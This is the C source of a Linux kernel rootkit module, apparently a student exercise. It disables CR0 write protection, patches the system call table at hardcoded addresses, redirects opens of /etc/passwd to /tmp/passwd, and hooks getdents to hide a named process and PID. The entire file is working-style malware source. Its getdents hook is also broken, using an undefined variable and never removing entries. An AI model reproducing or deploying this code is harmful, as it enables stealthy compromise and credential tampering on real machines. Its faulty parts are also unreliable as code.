#include <linux/module.h>      // for all modules 
#include <linux/init.h>        // for entry/exit macros 
#include <linux/kernel.h>      // for printk and other kernel bits 
#include <asm/current.h>       // process information
#include <linux/sched.h>
#include <linux/highmem.h>     // for changing page permissions
#include <asm/unistd.h>        // for system call constants
#include <linux/kallsyms.h>
#include <asm/page.h>
#include <asm/cacheflush.h>

//Macros for kernel functions to alter Control Register 0 (CR0)
//This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
//Bit 0 is the WP-bit (write protection). We want to flip this to 0
//so that we can change the read/write permissions of kernel pages.
#define read_cr0() (native_read_cr0())
#define write_cr0(x) (native_write_cr0(x))
#define BUFFLEN 1024

struct linux_dirent {
  u64 d_ino;
  s64 d_off;
  unsigned short d_reclen;
  char d_name[BUFFLEN];
};

//process ID
char* pid = "";
module_param(pid, charp, S_IRUSR | S_IWUSR | S_IRGRP | S_IROTH);
MODULE_PARM_DESC(pid, "Sneaky Process ID");

//These are function pointers to the system calls that change page
//permissions for the given address (page) to read-only or read-write.
//Grep for "set_pages_ro" and "set_pages_rw" in:
//      /boot/System.map-`$(uname -r)`
//      e.g. /boot/System.map-4.4.0-116-generic
void (*pages_rw)(struct page *page, int numpages) = (void *)0xffffffff81072040;
void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81071fc0;

//This is a pointer to the system call table in memory                                                                                                                               
//Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h                                                                                                             
//We're getting its adddress from the System.map file (see above).                                                                                                                   
static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;

//Function pointer will be used to save address of original 'open' syscall.
//The asmlinkage keyword is a GCC #define that indicates this function
//should expect ti find its arguments on the stack (not in registers).
//This is used for all system calls.
asmlinkage int (*original_call)(const char *pathname, int flags);
asmlinkage int (*original_getdents)(unsigned int fd, struct linux_dirent *dirp,unsigned int count);


//Define our new sneaky version of the 'open' syscall
asmlinkage int sneaky_sys_open(const char *pathname, int flags)
{
  //printk(KERN_INFO "Very, very Sneaky!\n");
  if(strstr(pathname,"/etc/passwd")){
    const char* sneakyPasswd = "/tmp/passwd";
    copy_to_user(pathname, sneakyPasswd, strlen(pathname));
  }
  return original_call(pathname, flags);
}

asmlinkage int sneaky_sys_getdents(unsigned int fd, struct linux_dirent *dirp,unsigned int count){
  int nread;
  int bpos = 0;
  int sneakySize = 0;
  struct linux_dirent *d = dirp;
  nread = original_getdents(fd, dirp, count);
  while(bpos < nread){
    /*
    if((strcmp(cur->d_name,"sneaky_process") == 0)||(strcmp(cur->d_name, pid) == 0)){
      // printf("here\n");
      size = size + cur->d_reclen;
      struct linux_dirent *temp;
      int backup;
      temp = (struct linux_dirent *)((char*)cur + cur->d_reclen);
      backup = (char*)dirp + result - (char*)cur - cur->d_reclen;
      memmove((char*)cur, (char*)temp, backup);
    }
    else{
    */

    if((strcmp(cur->d_name,"sneaky_process") == 0)||(strcmp(cur->d_name, pid) == 0)){
      sneakySize += d->d_reclen;
      
    }
    int temp = d->d_reclen;
    bpos += temp;
    d = (struct linux_dirent *)((char*)d + temp);
  }
  return nread;
}

//The code that gets executed when the module is loaded
static int initialize_sneaky_module(void)
{
  struct page *page_ptr;

  //See /var/log/syslog for kernel print output
  printk(KERN_INFO "Sneaky module being loaded.\n");
  printk(KERN_INFO "Process ID is %s.\n",pid);
  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));
  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is the magic! Save away the original 'open' system call
  //function address. Then overwrite its address in the system call
  //table with the function address of our new code.
  original_call = (void*)*(sys_call_table + __NR_open);
  *(sys_call_table + __NR_open) = (unsigned long)sneaky_sys_open;

  //list directory
  original_getdents = (void*)*(sys_call_table + __NR_getdents);
  *(sys_call_table + __NR_getdents) = (unsigned long)sneaky_sys_getdents;

  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
 
  return 0;       // to show a successful load 
  
}  


static void exit_sneaky_module(void) 
{
  
  struct page *page_ptr;

  printk(KERN_INFO "Sneaky module being unloaded.\n"); 

  //Turn off write protection mode
  write_cr0(read_cr0() & (~0x10000));

  //Get a pointer to the virtual page containing the address
  //of the system call table in the kernel.
  page_ptr = virt_to_page(&sys_call_table);
  //Make this page read-write accessible
  pages_rw(page_ptr, 1);

  //This is more magic! Restore the original 'open' system call
  //function address. Will look like malicious code was never there!
  *(sys_call_table + __NR_open) = (unsigned long)original_call;
  *(sys_call_table + __NR_getdents) = (unsigned long)original_getdents;
  
  //Revert page to read-only
  pages_ro(page_ptr, 1);
  //Turn write protection mode back on
  write_cr0(read_cr0() | 0x10000);
}  

MODULE_LICENSE("yl495");
module_init(initialize_sneaky_module);  // what's called upon loading 
module_exit(exit_sneaky_module);        // what's called upon unloading  

